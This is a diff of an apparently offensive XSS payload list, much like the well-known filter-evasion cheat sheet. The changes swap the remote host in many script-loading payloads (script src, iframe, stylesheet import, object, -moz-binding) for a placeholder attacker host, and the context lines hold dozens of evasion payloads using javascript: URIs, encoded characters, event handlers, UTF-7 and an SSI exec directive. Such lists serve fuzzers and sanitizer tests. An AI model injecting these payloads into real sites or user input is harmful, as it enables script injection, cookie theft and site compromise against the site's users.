@@ -27,7 +27,7 @@
 <marquee/onstart=alert()>
 <video/poster/onerror=alert()>
 <isindex/autofocus/onfocus=alert()>
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<SCRIPT SRC=http://flagellantX.xss/xss.js></SCRIPT>
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
@@ -51,14 +51,14 @@
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
 <IMG SRC=" &#14;  javascript:alert('XSS');">
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/XSS SRC="http://flagellantX.xss/xss.js"></SCRIPT>
 <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
-<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/SRC="http://flagellantX.xss/xss.js"></SCRIPT>
 <<SCRIPT>alert("XSS");//<</SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
-<SCRIPT SRC=//ha.ckers.org/.j>
+<SCRIPT SRC=http://flagellantX.xss/xss.js?< B >
+<SCRIPT SRC=//flagellantX.xss/.j>
 <IMG SRC="javascript:alert('XSS')"
-<iframe src=http://ha.ckers.org/scriptlet.html <
+<iframe src=http://flagellantX.xss/scriptlet.html <
 \";alert('XSS');//
 </script><script>alert('XSS');</script>
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
@@ -73,10 +73,10 @@
 <BGSOUND SRC="javascript:alert('XSS');">
 <BR SIZE="&{alert('XSS')}">
 <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
-<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
-<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
-<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
-<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<LINK REL="stylesheet" HREF="http://flagellantX.xss/xss.css">
+<STYLE>@import'http://flagellantX.xss/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://flagellantX.xss/xss.css>; REL=stylesheet">
+<STYLE>BODY{-moz-binding:url("http://flagellantX.xss/xssmoz.xml#xss")}</STYLE>
 <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
 <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
 exp/*<A STYLE='no\xss:noxss("*//*");
@@ -101,19 +101,19 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 <DIV STYLE="width: expression(alert('XSS'));">
 <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
 <BASE HREF="javascript:alert('XSS');//">
-<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<OBJECT TYPE="text/x-scriptlet" DATA="http://flagellantX.xss/scriptlet.html"></OBJECT>
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://flagellantX.xss/xss.js></SCRIPT>'"-->
 <? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
 <IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
 <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="http://flagellantX.xss/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="http://flagellantX.xss/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://flagellantX.xss/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://flagellantX.xss/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://flagellantX.xss/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://flagellantX.xss/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://flagellantX.xss/xss.js"></SCRIPT>
 <A HREF="http://66.102.7.147/">XSS</A>
 0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"
 veris-->group<svg/onload=alert(/XSS/)//
